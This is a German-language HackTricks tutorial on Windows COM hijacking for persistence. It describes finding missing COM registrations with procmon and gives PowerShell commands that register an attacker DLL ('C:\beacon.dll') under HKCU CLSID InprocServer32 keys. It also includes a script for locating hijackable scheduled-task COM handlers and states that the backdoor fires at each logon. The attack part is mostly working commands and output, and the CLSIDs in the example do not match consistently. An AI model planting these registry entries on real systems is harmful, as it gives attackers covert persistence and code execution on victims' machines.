# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Suche nach nicht existierenden COM-Komponenten

Da die Werte von HKCU von den Benutzern geändert werden können, könnte **COM Hijacking** als **persistente Mechanismen** verwendet werden. Mit `procmon` ist es einfach, nach COM-Registrierungen zu suchen, die nicht existieren und die ein Angreifer erstellen könnte, um persistente Zugriffe zu ermöglichen. Filter:

- **RegOpenKey**-Operationen.
- wo das _Ergebnis_ **NAME NOT FOUND** ist.
- und der _Pfad_ mit **InprocServer32** endet.

Sobald Sie entschieden haben, welche nicht existierende COM Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM nachzuahmen, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackbare Task Scheduler COM-Komponenten

Windows-Aufgaben verwenden benutzerdefinierte Trigger, um COM-Objekte aufzurufen, und da sie über den Task Scheduler ausgeführt werden, ist es einfacher vorherzusagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Zeige COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Aufgabenname: " $Task.TaskName
Write-Host "Aufgabenpfad: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Beispielausgabe:
<strong># Aufgabenname:  Beispiel
</strong># Aufgabenpfad:  \Microsoft\Windows\Beispiel\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [mehr wie das vorherige...]</code></pre>

Wenn Sie die Ausgabe überprüfen, können Sie eine auswählen, die **jedes Mal ausgeführt wird, wenn sich ein Benutzer anmeldet**.

Jetzt suchen Sie nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und in HKLM und HKCU, normalerweise werden Sie feststellen, dass der Wert in HKCU nicht existiert.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann können Sie einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn der Benutzer sich anmeldet, wird Ihr Backdoor aktiviert.

{{#include ../../banners/hacktricks-training.md}}
